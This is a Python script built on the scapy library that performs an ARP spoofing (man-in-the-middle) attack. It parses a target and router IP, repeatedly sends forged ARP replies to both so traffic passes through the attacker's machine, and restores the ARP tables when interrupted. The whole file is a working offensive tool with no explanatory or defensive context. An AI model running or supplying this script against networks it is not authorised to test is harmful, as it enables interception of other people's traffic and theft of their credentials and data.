import scapy.all as scapy
import optparse
import time
import sys


def parse():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Set target IP")
    parser.add_option("-r", "--router", dest="router_ip", help="Set router IP")
    user_input = parser.parse_args()[0]

    if not user_input.target_ip:
        parser.error("Please set target ip, use --help for more info")
    elif not user_input.router_ip:
        parser.error("Please set router ip, use --help for more info")
    return user_input


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = parse().target_ip
router_ip = parse().router_ip
sent_packets_count = 0
try:
    while True:
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] CTRL + C ...Quitting")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)
